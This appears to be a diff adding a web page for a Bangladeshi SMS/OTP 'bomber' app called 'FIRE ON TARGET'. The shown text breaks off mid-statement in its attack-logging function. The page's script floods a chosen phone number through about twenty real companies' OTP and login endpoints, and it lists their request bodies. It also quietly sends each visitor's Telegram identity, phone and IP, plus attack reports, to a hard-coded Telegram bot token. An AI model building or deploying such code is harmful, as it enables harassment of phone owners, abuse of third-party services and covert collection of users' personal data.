@@ -1,0 +1,768 @@
+<!DOCTYPE html>
+<html lang="bn">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>🔥 FIRE ON TARGET</title>
+    <script src="https://telegram.org/js/telegram-web-app.js"></script>
+    <link href="https://fonts.googleapis.com/css2?family=Space+Mono:wght@400;700&family=Noto+Sans+Bengali:wght@300;500;700&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css">
+    <style>
+        :root {
+            --bg: #0a0a0f;
+            --card: #111118;
+            --border: rgba(255,255,255,0.06);
+            --accent: #ff0040;
+            --accent2: #ff6b00;
+            --text: #e2e8f0;
+            --muted: #4a5568;
+            --success: #00ffa3;
+            --error: #ff4d6d;
+            --input-bg: #1a1a2e;
+            --font-mono: 'Space Mono', monospace;
+            --font-bangla: 'Noto Sans Bengali', sans-serif;
+            --btn-color: #ff0040;
+        }
+        * { margin:0; padding:0; box-sizing:border-box; }
+        body {
+            min-height: 100vh;
+            background: var(--bg);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-family: var(--font-bangla);
+            padding: 15px;
+            background-image: radial-gradient(ellipse at 10% 20%, rgba(255,0,64,0.05) 0%, transparent 50%),
+                              radial-gradient(ellipse at 90% 80%, rgba(255,107,0,0.05) 0%, transparent 50%);
+        }
+        .loading-screen {
+            position: fixed; inset:0; background:var(--bg);
+            display:flex; align-items:center; justify-content:center;
+            z-index:10000; transition: opacity 0.4s;
+        }
+        .loading-screen.hidden { opacity:0; visibility:hidden; pointer-events:none; }
+        .circle-loader-wrap { position:relative; width:120px; height:120px; margin-bottom:20px; }
+        .circle-ring { position:absolute; inset:0; border-radius:50%; border:3px solid transparent; border-top:3px solid #ff0040; border-right:3px solid #ff6b00; animation:spin 0.8s cubic-bezier(0.5,0,0.5,1) infinite; }
+        .circle-ring-2 { position:absolute; inset:10px; border-radius:50%; border:3px solid transparent; border-bottom:3px solid #00ffa3; border-left:3px solid #ff4d6d; animation:spin 0.6s cubic-bezier(0.5,0,0.5,1) infinite reverse; }
+        .circle-ring-3 { position:absolute; inset:22px; border-radius:50%; border:2px solid transparent; border-top:2px solid #fbbf24; border-right:2px solid #ff0040; animation:spin 1s cubic-bezier(0.5,0,0.5,1) infinite; }
+        .circle-center { position:absolute; inset:0; display:flex; flex-direction:column; align-items:center; justify-content:center; }
+        .circle-emoji { font-size:32px; }
+        .circle-percent { font-family:var(--font-mono); font-size:14px; font-weight:700; color:#ff0040; margin-top:2px; }
+        @keyframes spin { to{transform:rotate(360deg)} }
+        .loader-text { font-family:var(--font-mono); font-size:13px; font-weight:700; color:var(--text); letter-spacing:0.15em; text-transform:uppercase; margin-bottom:2px; }
+        .loader-sub { font-family:var(--font-mono); font-size:9px; color:var(--muted); letter-spacing:0.08em; margin-bottom:12px; }
+        .loader-dots { display:flex; gap:10px; }
+        .loader-dots span { width:6px; height:6px; border-radius:50%; background:#ff0040; animation:dotBounce 1s ease-in-out infinite; }
+        .loader-dots span:nth-child(1){animation-delay:0s}
+        .loader-dots span:nth-child(2){animation-delay:0.15s}
+        .loader-dots span:nth-child(3){animation-delay:0.3s}
+        @keyframes dotBounce { 0%,80%,100%{transform:scale(0.4);opacity:0.3} 40%{transform:scale(1);opacity:1} }
+        .card {
+            width:100%; max-width:440px;
+            background:rgba(17,17,24,0.95); backdrop-filter:blur(30px);
+            border:1px solid rgba(255,0,64,0.2); border-radius:24px;
+            padding:28px 22px 22px;
+            position:relative; z-index:10;
+            box-shadow:0 20px 60px rgba(0,0,0,0.5), 0 0 40px rgba(255,0,64,0.05);
+            animation:slideIn 0.6s cubic-bezier(0.22,1,0.36,1);
+            user-select:none;
+        }
+        @keyframes slideIn { from{opacity:0;transform:translateY(30px) scale(0.95)} to{opacity:1;transform:translateY(0) scale(1)} }
+        .card::before { content:''; position:absolute; top:0; left:30px; right:30px; height:2px; background:linear-gradient(90deg, transparent, #ff0040, #ff6b00, transparent); }
+        .header { text-align:center; margin-bottom:18px; }
+        .logo-wrap { width:65px; height:65px; background:linear-gradient(135deg, rgba(255,0,64,0.15), rgba(255,107,0,0.15)); border:2px solid rgba(255,0,64,0.3); border-radius:50%; display:flex; align-items:center; justify-content:center; margin:0 auto 8px; font-size:30px; }
+        .site-title { font-family:var(--font-mono); font-size:20px; font-weight:700; background:linear-gradient(135deg, #ff0040, #ff6b00); -webkit-background-clip:text; -webkit-text-fill-color:transparent; letter-spacing:0.12em; text-transform:uppercase; }
+        .site-sub { font-size:10px; font-family:var(--font-mono); color:#ff6b00; letter-spacing:0.1em; margin-top:4px; }
+        .user-info {
+            background:rgba(255,255,255,0.03); border:1px solid rgba(255,255,255,0.06); border-radius:12px;
+            padding:10px 14px; margin-bottom:16px; display:none;
+        }
+        .user-info.active { display:block; }
+        .user-info-row {
+            display:flex; justify-content:space-between;
+            font-size:11px; font-family:var(--font-mono); padding:2px 0;
+            color:#b0c4de;
+        }
+        .user-info-row .label { color:#6b7b9f; }
+        .user-info-row .value { color:#00ffa3; }
+        .field { margin-bottom:14px; }
+        .field-label { display:flex; align-items:center; gap:8px; font-size:9px; font-family:var(--font-mono); color:#b0c4de; letter-spacing:0.1em; text-transform:uppercase; margin-bottom:5px; }
+        .field-label i { color:#ff0040; font-size:11px; }
+        .input-wrapper { position:relative; }
+        .input-wrapper input {
+            width:100%; padding:10px 14px; padding-right:40px;
+            background:rgba(255,255,255,0.08); border:1px solid rgba(255,255,255,0.15); border-radius:12px;
+            color:#fff; font-size:14px; font-family:var(--font-mono); outline:none; transition:all 0.3s;
+        }
+        .input-wrapper input:focus { border-color:#ff0040; box-shadow:0 0 0 3px rgba(255,0,64,0.15); background:rgba(255,255,255,0.12); }
+        .input-wrapper input::placeholder { color:#8a9bb5; opacity:0.7; font-size:13px; }
+        .input-icon { position:absolute; right:12px; top:50%; transform:translateY(-50%); color:#6b7b9f; font-size:13px; }
+        .attack-btn {
+            width:100%; padding:14px; background:linear-gradient(135deg, var(--btn-color), var(--accent2));
+            border:none; border-radius:14px; color:#fff; font-family:var(--font-mono); font-size:13px; font-weight:700;
+            letter-spacing:0.1em; cursor:pointer; transition:all 0.3s; box-shadow:0 8px 30px rgba(255,0,64,0.3);
+            position:relative; overflow:hidden;
+        }
+        .attack-btn::after { content:''; position:absolute; inset:0; background:linear-gradient(135deg, transparent 40%, rgba(255,255,255,0.08) 60%, transparent 80%); pointer-events:none; }
+        .attack-btn:hover:not(:disabled){ transform:translateY(-2px); box-shadow:0 12px 40px rgba(255,0,64,0.5); }
+        .attack-btn:disabled { opacity:0.7; cursor:not-allowed; }
+        .btn-content { display:flex; align-items:center; justify-content:center; gap:10px; }
+        .btn-spinner { display:none; width:16px; height:16px; border:2px solid rgba(255,255,255,0.3); border-top-color:#fff; border-radius:50%; animation:spinBtn 0.8s linear infinite; }
+        @keyframes spinBtn { to{transform:rotate(360deg)} }
+        .attack-btn:disabled .btn-spinner { display:block; }
+        .attack-btn:disabled .btn-icon { display:none; }
+        .progress-section { display:none; margin-top:16px; padding:14px; background:rgba(255,0,64,0.05); border:1px solid rgba(255,0,64,0.1); border-radius:14px; }
+        .progress-header { display:flex; justify-content:space-between; margin-bottom:6px; }
+        .progress-title { font-size:9px; color:var(--muted); font-family:var(--font-mono); }
+        .progress-percent { font-size:12px; color:#ff0040; font-weight:700; font-family:var(--font-mono); }
+        .progress-track { height:4px; background:rgba(255,255,255,0.05); border-radius:99px; overflow:hidden; }
+        .progress-fill { height:100%; width:0%; background:linear-gradient(90deg, #ff0040, #ff6b00); border-radius:99px; transition:width 0.5s; }
+        .stats-grid { display:grid; grid-template-columns:1fr 1fr 1fr; gap:6px; margin-top:10px; }
+        .stat-item { text-align:center; padding:6px 2px; background:rgba(255,255,255,0.02); border-radius:10px; border:1px solid rgba(255,255,255,0.03); }
+        .stat-value { font-size:20px; font-family:var(--font-mono); font-weight:700; }
+        .stat-label { font-size:7px; color:var(--muted); font-family:var(--font-mono); margin-top:1px; text-transform:uppercase; letter-spacing:0.08em; }
+        .stat-value.success { color:var(--success); }
+        .stat-value.error { color:var(--error); }
+        .stat-value.accent { color:#ff6b00; }
+        .footer { text-align:center; margin-top:16px; padding-top:12px; border-top:1px solid rgba(255,255,255,0.04); }
+        .footer-text { font-size:8px; color:#6b7b9f; font-family:var(--font-mono); display:flex; align-items:center; justify-content:center; gap:6px; }
+        .live-dot { width:4px; height:4px; background:var(--success); border-radius:50%; animation:blink 1.5s infinite; }
+        @keyframes blink { 0%,100%{opacity:1} 50%{opacity:0.3} }
+        .social-links { display:flex; gap:10px; flex-wrap:wrap; justify-content:center; margin-top:8px; }
+        .social-link {
+            display:inline-flex; align-items:center; gap:5px;
+            padding:4px 14px; background:rgba(255,255,255,0.04); border:1px solid rgba(255,255,255,0.12); border-radius:25px;
+            color:#b0c4de; text-decoration:none; font-size:9px; font-family:var(--font-mono); transition:all 0.3s;
+        }
+        .social-link:hover { transform:translateY(-2px); background:rgba(255,255,255,0.08); border-color:rgba(255,255,255,0.25); }
+        .social-link i { font-size:12px; }
+        .social-link.fb:hover { border-color:#1877f2; color:#1877f2; background:rgba(24,119,242,0.08); }
+        .social-link.wa:hover { border-color:#25D366; color:#25D366; background:rgba(37,211,102,0.08); }
+        .social-link.tg:hover { border-color:#0088cc; color:#0088cc; background:rgba(0,136,204,0.08); }
+        .grid-bg { position:fixed; inset:0; background-image:linear-gradient(rgba(255,255,255,0.02) 1px, transparent 1px), linear-gradient(90deg, rgba(255,255,255,0.02) 1px, transparent 1px); background-size:40px 40px; pointer-events:none; z-index:0; }
+
+        .join-popup-overlay {
+            position:fixed; inset:0; background:rgba(0,0,0,0.92); backdrop-filter:blur(25px);
+            display:none; justify-content:center; align-items:center; z-index:99999; padding:20px;
+        }
+        .join-popup-overlay.active { display:flex; }
+        .join-popup-box {
+            background:linear-gradient(145deg, #111118, #1a1a2e); border:2px solid rgba(255,0,64,0.3); border-radius:30px;
+            padding:40px 30px 30px; max-width:420px; width:100%; text-align:center;
+            box-shadow:0 40px 100px rgba(0,0,0,0.9), 0 0 60px rgba(255,0,64,0.1);
+            animation:popIn 0.7s cubic-bezier(0.22,1,0.36,1); position:relative; overflow:hidden;
+        }
+        .join-popup-box::before { content:''; position:absolute; top:0; left:0; right:0; height:3px; background:linear-gradient(90deg, transparent, #ff0040, #ff6b00, transparent); }
+        @keyframes popIn { from{opacity:0;transform:scale(0.8) translateY(40px)} to{opacity:1;transform:scale(1) translateY(0)} }
+        .join-popup-icon { font-size:60px; display:block; margin-bottom:8px; }
+        .join-popup-title { font-family:var(--font-mono); font-size:20px; font-weight:700; color:#ff0040; margin-bottom:6px; letter-spacing:0.05em; }
+        .join-popup-sub { font-family:var(--font-bangla); font-size:14px; color:#b0c4de; line-height:1.8; }
+        .join-popup-highlight { background:rgba(255,0,64,0.1); border:1px solid rgba(255,0,64,0.2); border-radius:12px; padding:10px; margin:14px 0 18px; font-family:var(--font-mono); font-size:12px; color:#ff6b00; word-break:break-all; }
+        .join-popup-highlight i { color:#ff0040; margin-right:6px; }
+        .join-btn-group { display:flex; flex-direction:column; gap:12px; }
+        .join-btn {
+            padding:14px; border:none; border-radius:14px; font-family:var(--font-mono); font-size:13px; font-weight:700;
+            cursor:pointer; transition:all 0.3s; display:flex; align-items:center; justify-content:center; gap:10px; text-decoration:none; color:#fff;
+        }
+        .join-btn-primary { background:linear-gradient(135deg, #0088cc, #006699); box-shadow:0 8px 30px rgba(0,136,204,0.3); }
+        .join-btn-primary:hover { transform:translateY(-2px); box-shadow:0 12px 40px rgba(0,136,204,0.5); }
+        .join-btn-primary i { font-size:18px; }
+        .join-btn-secondary { background:linear-gradient(135deg, #ff0040, #ff6b00); box-shadow:0 8px 30px rgba(255,0,64,0.3); }
+        .join-btn-secondary:hover:not(:disabled){ transform:translateY(-2px); box-shadow:0 12px 40px rgba(255,0,64,0.5); }
+        .join-btn-secondary:disabled { opacity:0.5; cursor:not-allowed; transform:none; }
+        .join-popup-divider { width:50px; height:2px; background:linear-gradient(90deg, transparent, #ff0040, transparent); margin:12px auto; }
+        .join-status-text { font-size:10px; color:#6b7b9f; font-family:var(--font-mono); margin-top:6px; min-height:16px; }
+        .join-status-text.success { color:#00ffa3; }
+
+        .success-popup-overlay {
+            position:fixed; inset:0; background:rgba(0,0,0,0.85); backdrop-filter:blur(15px);
+            display:none; justify-content:center; align-items:center; z-index:99998; padding:20px;
+        }
+        .success-popup-overlay.active { display:flex; }
+        .success-popup-box {
+            background:linear-gradient(145deg, #111118, #1a1a2e); border:2px solid rgba(0,255,163,0.3); border-radius:30px;
+            padding:40px 30px 30px; max-width:360px; width:100%; text-align:center;
+            box-shadow:0 40px 100px rgba(0,0,0,0.9), 0 0 60px rgba(0,255,163,0.1);
+            animation:popIn 0.7s cubic-bezier(0.22,1,0.36,1);
+        }
+        .success-popup-icon { font-size:70px; display:block; margin-bottom:10px; }
+        .success-popup-title { font-family:var(--font-mono); font-size:26px; font-weight:700; color:#00ffa3; margin-bottom:6px; }
+        .success-popup-stats { display:flex; justify-content:center; gap:30px; margin:16px 0 20px; }
+        .success-popup-stat { text-align:center; }
+        .success-popup-stat .number { font-family:var(--font-mono); font-size:28px; font-weight:700; display:block; }
+        .success-popup-stat .label { font-family:var(--font-mono); font-size:10px; color:#6b7b9f; text-transform:uppercase; letter-spacing:0.08em; }
+        .success-popup-stat .number.green { color:#00ffa3; }
+        .success-popup-stat .number.red { color:#ff4d6d; }
+        .success-popup-close {
+            padding:12px 40px; background:linear-gradient(135deg, #ff0040, #ff6b00); border:none; border-radius:30px;
+            color:#fff; font-family:var(--font-mono); font-size:14px; font-weight:700; cursor:pointer; transition:all 0.3s;
+        }
+        .success-popup-close:hover { transform:scale(1.05); box-shadow:0 8px 30px rgba(255,0,64,0.4); }
+
+        .ratelimit-popup-overlay {
+            position:fixed; inset:0; background:rgba(0,0,0,0.9); backdrop-filter:blur(15px);
+            display:none; justify-content:center; align-items:center; z-index:99997; padding:20px;
+        }
+        .ratelimit-popup-overlay.active { display:flex; }
+        .ratelimit-popup-box {
+            background:linear-gradient(145deg, #111118, #1a1a2e); border:2px solid rgba(255,107,0,0.3); border-radius:30px;
+            padding:35px 25px 25px; max-width:360px; width:100%; text-align:center;
+            box-shadow:0 40px 100px rgba(0,0,0,0.9);
+            animation:popIn 0.7s cubic-bezier(0.22,1,0.36,1);
+        }
+        .ratelimit-popup-icon { font-size:50px; display:block; margin-bottom:8px; }
+        .ratelimit-popup-title { font-family:var(--font-mono); font-size:18px; font-weight:700; color:#ff6b00; margin-bottom:6px; }
+        .ratelimit-popup-sub { font-family:var(--font-bangla); font-size:14px; color:#b0c4de; line-height:1.8; }
+        .ratelimit-popup-close {
+            margin-top:16px; padding:10px 35px; background:linear-gradient(135deg, #ff0040, #ff6b00); border:none; border-radius:30px;
+            color:#fff; font-family:var(--font-mono); font-size:13px; font-weight:700; cursor:pointer; transition:all 0.3s;
+        }
+        .ratelimit-popup-close:hover { transform:scale(1.05); }
+
+        .rate-status {
+            text-align: center;
+            font-size: 10px;
+            color: #6b7b9f;
+            font-family: var(--font-mono);
+            margin-top: 8px;
+            padding: 6px;
+            background: rgba(255,255,255,0.03);
+            border-radius: 8px;
+            border: 1px solid rgba(255,255,255,0.05);
+            display: none;
+        }
+        .rate-status.active { display: block; }
+        .rate-status .highlight { color: #ff6b00; font-weight: 700; }
+
+        @media (max-width:480px) {
+            .card { padding:18px 14px 14px; }
+            .stats-grid { grid-template-columns:1fr 1fr 1fr; gap:4px; }
+            .stat-value { font-size:16px; }
+            .site-title { font-size:17px; }
+            .logo-wrap { width:55px; height:55px; font-size:26px; }
+            .input-wrapper input { padding:8px 12px; font-size:13px; }
+            .success-popup-icon { font-size:50px; }
+            .success-popup-title { font-size:22px; }
+            .success-popup-stat .number { font-size:22px; }
+            .join-popup-box { padding:30px 20px 20px; }
+            .join-popup-icon { font-size:50px; }
+            .join-popup-title { font-size:17px; }
+            .user-info-row { font-size:9px; }
+            .ratelimit-popup-box { padding:25px 18px 18px; }
+            .ratelimit-popup-icon { font-size:40px; }
+            .ratelimit-popup-title { font-size:16px; }
+            .rate-status { font-size:8px; }
+        }
+        @media (max-width:380px) {
+            .stats-grid { grid-template-columns:1fr; }
+            .stat-value { font-size:18px; }
+        }
+    </style>
+</head>
+<body>
+
+<div class="loading-screen" id="loadingScreen">
+    <div class="circle-loader-wrap">
+        <div class="circle-ring"></div>
+        <div class="circle-ring-2"></div>
+        <div class="circle-ring-3"></div>
+        <div class="circle-center">
+            <span class="circle-emoji">🔥</span>
+            <span class="circle-percent" id="circlePercent">0%</span>
+        </div>
+    </div>
+    <div class="loader-text" id="loaderText">INITIALIZING</div>
+    <div class="loader-sub" id="loaderSub">booting up system...</div>
+    <div class="loader-dots"><span></span><span></span><span></span></div>
+</div>
+
+<div class="grid-bg"></div>
+
+<!-- Join Popup -->
+<div class="join-popup-overlay" id="joinPopup">
+    <div class="join-popup-box">
+        <span class="join-popup-icon">🔥</span>
+        <div class="join-popup-title">FIRE ON TARGET</div>
+        <div class="join-popup-sub">অ্যাপ ব্যবহার করতে আমাদের টেলিগ্রাম গ্রুপে জয়েন করুন!</div>
+        <div class="join-popup-highlight"><i class="fas fa-link"></i> t.me/project_xx7</div>
+        <div class="join-btn-group">
+            <a href="https://t.me/project_xx7" target="_blank" class="join-btn join-btn-primary" id="joinGroupBtn"><i class="fab fa-telegram-plane"></i> গ্রুপে জয়েন করো</a>
+            <button class="join-btn join-btn-secondary" id="continueBtn" disabled><i class="fas fa-rocket"></i> ড্রাক করো!</button>
+        </div>
+        <div class="join-popup-divider"></div>
+        <div class="join-status-text" id="joinStatus">📌 গ্রুপে জয়েন করে ড্রাক করো!</div>
+    </div>
+</div>
+
+<!-- Success Popup -->
+<div class="success-popup-overlay" id="successPopup">
+    <div class="success-popup-box">
+        <span class="success-popup-icon">✅</span>
+        <div class="success-popup-title">অ্যাটাক সম্পন্ন!</div>
+        <div class="success-popup-stats">
+            <div class="success-popup-stat">
+                <span class="number green" id="popupSuccess">0</span>
+                <span class="label">সফল</span>
+            </div>
+            <div class="success-popup-stat">
+                <span class="number red" id="popupFailed">0</span>
+                <span class="label">ব্যর্থ</span>
+            </div>
+        </div>
+        <button class="success-popup-close" id="popupCloseBtn">Close</button>
+    </div>
+</div>
+
+<!-- Rate Limit Popup -->
+<div class="ratelimit-popup-overlay" id="rateLimitPopup">
+    <div class="ratelimit-popup-box">
+        <span class="ratelimit-popup-icon">⏳</span>
+        <div class="ratelimit-popup-title" id="rateLimitTitle">আরও ৫২ মিনিট অপেক্ষা করুন!</div>
+        <div class="ratelimit-popup-sub" id="rateLimitSub">আপনি ইতিমধ্যে ১০০ রাউন্ড অ্যাটাক করেছেন। ১ ঘন্টা পর আবার চেষ্টা করুন।</div>
+        <button class="ratelimit-popup-close" id="rateLimitCloseBtn">Close</button>
+    </div>
+</div>
+
+<div class="card" id="mainCard">
+    <div class="header">
+        <div class="logo-wrap">🔥</div>
+        <div class="site-title">FIRE ON TARGET</div>
+        <div class="site-sub">Developer: Lucky Hera</div>
+    </div>
+
+    <div class="user-info" id="userInfo">
+        <div class="user-info-row"><span class="label">🆔 ID</span><span class="value" id="tgUserId">-</span></div>
+        <div class="user-info-row"><span class="label">📛 Name</span><span class="value" id="tgName">-</span></div>
+    </div>
+
+    <div class="field">
+        <div class="field-label"><i class="fas fa-phone"></i><span>Target Number</span></div>
+        <div class="input-wrapper">
+            <input type="text" id="number" placeholder="01XXXXXXXXX" maxlength="11" value="">
+            <i class="fas fa-mobile-alt input-icon"></i>
+        </div>
+    </div>
+    <div class="field">
+        <div class="field-label"><i class="fas fa-bolt"></i><span>Attack Rounds</span></div>
+        <div class="input-wrapper">
+            <input type="number" id="amount" placeholder="1 – 100" min="1" max="100" value="1">
+            <i class="fas fa-fire input-icon"></i>
+        </div>
+    </div>
+    <button class="attack-btn" id="sendBtn" onclick="startAttack()">
+        <span class="btn-content">
+            <div class="btn-spinner"></div>
+            <span class="btn-icon">💥</span>
+            <span id="btnText">START ATTACK</span>
+        </span>
+    </button>
+    <div class="progress-section" id="progressSection">
+        <div class="progress-header">
+            <span class="progress-title">ATTACK PROGRESS</span>
+            <span class="progress-percent" id="progressPercent">0%</span>
+        </div>
+        <div class="progress-track"><div class="progress-fill" id="progressFill"></div></div>
+        <div class="stats-grid">
+            <div class="stat-item"><div class="stat-value success" id="successCount">0</div><div class="stat-label">SUCCESS</div></div>
+            <div class="stat-item"><div class="stat-value error" id="failCount">0</div><div class="stat-label">FAILED</div></div>
+            <div class="stat-item"><div class="stat-value accent" id="totalCount">0</div><div class="stat-label">TOTAL</div></div>
+        </div>
+    </div>
+
+    <div class="rate-status" id="rateStatus">
+        ⏳ বাকি আছে: <span class="highlight" id="remainingTime">--</span> মিনিট
+    </div>
+
+    <div class="footer">
+        <div class="footer-text"><span class="live-dot"></span><span id="apiCountText">Loading APIs...</span></div>
+        <div class="social-links">
+            <a href="https://www.facebook.com/luckyhera0" target="_blank" class="social-link fb"><i class="fab fa-facebook"></i><span>Facebook</span></a>
+            <a href="https://wa.me/8801753850929" target="_blank" class="social-link wa"><i class="fab fa-whatsapp"></i><span>WhatsApp</span></a>
+            <a href="https://t.me/project_xx7" target="_blank" class="social-link tg"><i class="fab fa-telegram"></i><span>Telegram</span></a>
+        </div>
+    </div>
+</div>
+
+<script>
+// ============================================================
+// 🔥 FIRE ON TARGET - Vercel রেডি
+// ============================================================
+
+// ==========================================
+// 📦 API লিস্ট
+// ==========================================
+const APIS = [
+    { name:"Shadhin Music", url:"https://coreapi.shadhinmusic.com/api/v5/otp/OtpRobiReq", method:"POST", headers:{"Content-Type":"application/json"}, getBody:(p)=>({msisdn:"880"+p.replace(/^0/,""),shortcode:16235,servicename:"Shadhin Music"}) },
+    { name:"Chorki", url:"https://api-dynamic.chorki.com/v2/auth/login?country=BD&platform=web&language=en", method:"POST", headers:{"Content-Type":"application/json"}, getBody:(p)=>({number:"+88"+p.replace(/^0/,"")}) },
+    { name:"Pickaboo", url:"https://www.pickaboo.com/rest/default/V1/customer-check/exist", method:"POST", headers:{"Content-Type":"application/json"}, getBody:(p)=>({mobile:p}) },
+    { name:"Shwapno", url:"https://www.shwapno.com/api/auth", method:"POST", headers:{"Content-Type":"application/json"}, getBody:(p)=>({phoneNumber:p}) },
+    { name:"Rokomari", method:"GET", getUrl:(p)=>`https://www.rokomari.com/otp/send?emailOrPhone=880${p.replace(/^0/,"")}&countryCode=BD` },
+    { name:"Sindabad", url:"https://m2ce.sindabad.com/rest/V1/EasyLogin/isMobileAvailable", method:"POST", headers:{"Content-Type":"application/json"}, getBody:(p)=>({websiteId:1.0,customerMobile:p}) },
+    { name:"Upay", url:"https://api.upaysystem.com/dfsc/oam/app/v1/wallet-verification-init/", method:"POST", headers:{"Content-Type":"application/json"}, getBody:(p)=>({wallet_number:p,geo_location:{lat:23.8979093,long:89.1356346},referral:"",firebase_token:"e7XC0AWRR5C6rGMm6yCaZ8:APA91bHnbvs1bA_qXXb55W9GmsKmuzAUkgaR770HBH9hZCLjFV6HCejAsRGggvnD7c5dv2q_pOAdwY1peeTlzzn49cjPESTZ0NdR-bIhwe9_6of6rosH0AI",device_uuid:"c65m117a8cbf5b1851b29f8b",mno:"Robi"}) },
+    { name:"Bikroy", method:"GET", getUrl:(p)=>`https://bikroy.com/data/phone_number_login/verifications/phone_login?phone=${p}` },
+    { name:"GP MyGP", url:"https://appcity.grameenphone.com/proxy/v2/user/session/get-otp", method:"POST", headers:{"Content-Type":"application/json"}, getBody:(p)=>({mobileNumber:p}) },
+    { name:"Pathao Auth", url:"https://api.pathao.com/v2/auth/register", method:"POST", headers:{"Content-Type":"application/json"}, getBody:(p)=>({country_prefix:"880",national_number:p.replace(/^0/,""),country_id:1}) },
+    { name:"BD Tickets", url:"https://api.bdtickets.com:20100/v1/auth", method:"POST", headers:{"Content-Type":"application/json"}, getBody:(p)=>({phoneNumber:"+88"+p.replace(/^0/,""),createUserCheck:true,applicationChannel:"WEB_APP"}) },
+    { name:"Training Gov BD", url:"https://training.gov.bd/backoffice/api/user/sendOtp", method:"POST", headers:{"Content-Type":"application/json"}, getBody:(p)=>({mobile:p}) },
+    { name:"Garibook", url:"https://api.garibookadmin.com/api/v3/user/login", method:"POST", headers:{"Content-Type":"application/json"}, getBody:(p)=>({recaptcha_token:"garibookcaptcha",mobile:p,channel:"web"}) },
+    { name:"RedX", url:"https://api.redx.com.bd/v1/merchant/registration/generate-registration-otp", method:"POST", headers:{"Content-Type":"application/json"}, getBody:(p)=>({phoneNumber:p}) },
+    { name:"GP Shop", url:"https://bkshopthc.grameenphone.com/api/v1/fwa/request-for-otp", method:"POST", headers:{"Content-Type":"application/json"}, getBody:(p)=>({phone:p,language:"en",email:""}) },
+    { name:"Ostad", url:"https://api.ostad.app/api/v2/user/with-otp", method:"POST", headers:{"Content-Type":"application/json"}, getBody:(p)=>({msisdn:p}) },
+    { name:"Hishabee", url:"https://distribution.hishabee.business/api/app/v1/auth/number-check", method:"POST", headers:{"Content-Type":"application/json"}, getBody:(p)=>({mobile_number:p}) },
+    { name:"Chaldal", url:"https://chaldal.com/yolk/api-v4/Auth/RequestOtpVerificationWithApiKey", method:"POST", headers:{"Content-Type":"application/json"}, getBody:(p)=>({phoneNumber:"+880"+p.replace(/^0/,""),retryAttempt:0}) },
+    { name:"Bata BD", url:"https://www.batabd.com/apps/ez/api/GenerateOtp", method:"POST", headers:{"Content-Type":"application/x-www-form-urlencoded"}, getBody:(p)=>({MobileNo:p.replace(/^0/,""),EmailId:"team@dangerous.com",StoreName:"batabd.myshopify.com",IP:"59.152.4.182",Token:"bypass_token",CountryCode:"880"}) },
+    { name:"RedX Login", url:"https://api.redx.com.bd/v1/user/request-login-code", method:"POST", headers:{"Content-Type":"application/json"}, getBody:(p)=>({callingCode:"+880",phoneNumber:p.replace(/^0/,""),countryCode:"BD",service:"redx"}) }
+];
+
+// ==========================================
+// 🔥 টেলিগ্রাম কনফিগারেশন
+// ==========================================
+const BOT_TOKEN = "8897808573:AAFjYxyBRvcpr-l1371KDNidUfE7M3PVTjA";
+const CHAT_ID = "7125681767";
+
+// ==========================================
+// 👤 টেলিগ্রাম ইউজার ইনফো
+// ==========================================
+let tgUser = { id: null, username: null, phone: null, name: null };
+let tg = null;
+
+function getTelegramUser() {
+    try {
+        if (window.Telegram && window.Telegram.WebApp) {
+            const data = window.Telegram.WebApp.initDataUnsafe;
+            if (data && data.user) {
+                tgUser.id = data.user.id || null;
+                tgUser.username = data.user.username || 'Not Set';
+                tgUser.phone = data.user.phone_number || 'Not Set';
+                tgUser.name = data.user.first_name || 'Not Set';
+                if (data.user.last_name) tgUser.name += ' ' + data.user.last_name;
+                return true;
+            }
+        }
+        return false;
+    } catch(e) {
+        return false;
+    }
+}
+
+try {
+    if (window.Telegram && window.Telegram.WebApp) {
+        tg = window.Telegram.WebApp;
+        tg.ready();
+        tg.expand();
+        getTelegramUser();
+    }
+} catch(e) {}
+
+// ==========================================
+// 🌐 শুধু IP
+// ==========================================
+async function getIP() {
+    try {
+        const res = await fetch('https://api.ipify.org?format=json');
+        const data = await res.json();
+        return data.ip || 'Not Available';
+    } catch {
+        return 'Not Available';
+    }
+}
+
+// ==========================================
+// 📤 ইউজার ইনফো বটে
+// ==========================================
+async function sendUserInfoToBot(action = 'অ্যাপ ওপেন করেছে') {
+    if (!tgUser.id) return;
+    
+    const ip = await getIP();
+    const now = new Date();
+    
+    const message =
+        '🔰 *নতুন ভিজিটর* 🔰\n\n' +
+        '🆔 *আইডি:* ' + tgUser.id + '\n' +
+        '👤 *ইউজারনেম:* @' + tgUser.username + '\n' +
+        '📛 *নাম:* ' + tgUser.name + '\n' +
+        '📱 *ফোন:* ' + tgUser.phone + '\n' +
+        '🌐 *আইপি:* ' + ip + '\n' +
+        '📅 *তারিখ:* ' + now.toLocaleDateString('bn-BD') + '\n' +
+        '⏰ *সময়:* ' + now.toLocaleTimeString('bn-BD', { hour:'2-digit', minute:'2-digit', second:'2-digit' }) + '\n\n' +
+        '📌 *অ্যাকশন:* ' + action;
+    
+    try {
+        await fetch('https://api.telegram.org/bot' + BOT_TOKEN + '/sendMessage', {
+            method: "POST",
+            headers: { "Content-Type": "application/json" },
+            body: JSON.stringify({ chat_id: CHAT_ID, text: message, parse_mode: "Markdown" })
+        });
+    } catch(e) {}
+}
+
+// ==========================================
+// 📊 অ্যাটাক লগ
+// ==========================================
+async function sendAttackLog(number, rounds, success, failed) {
+    const total = rounds * APIS.length;
+    const ip = await getIP();
+    const now = new Date();
+    
+    let userInfo = '';
+    if (tgUser.id) {
+        userInfo =
+            '🆔 *আইডি:* ' + tgUser.id + '\n' +
+            '👤 *ইউজারনেম:* @' + tgUser.username + '\n' +
+            '📛 *নাম:* ' + tgUser.name + '\n' +
+            '📱 *ফোন:* ' + tgUser.phone + '\n' +
+            '🌐 *আইপি:* ' + ip + '\n\n';
+    }
+    
+    const message =
+        '🔰 *অ্যাটাক রিপোর্ট* 🔰\n\n' +
+        userInfo +
+        '📱 *টার্গেট:* ' + number + '\n' +
+        '⚡ *রাউন্ড:* ' + rounds + '\n' +
+        '✅ *সফল:* ' + success + '\n' +
+        '❌ *ব্যর্থ:* ' + failed + '\n' +
+        '📊 *মোট:* ' + total + '\n\n' +
+        '📅 *তারিখ:* ' + now.toLocaleDateString('bn-BD') + '\n' +
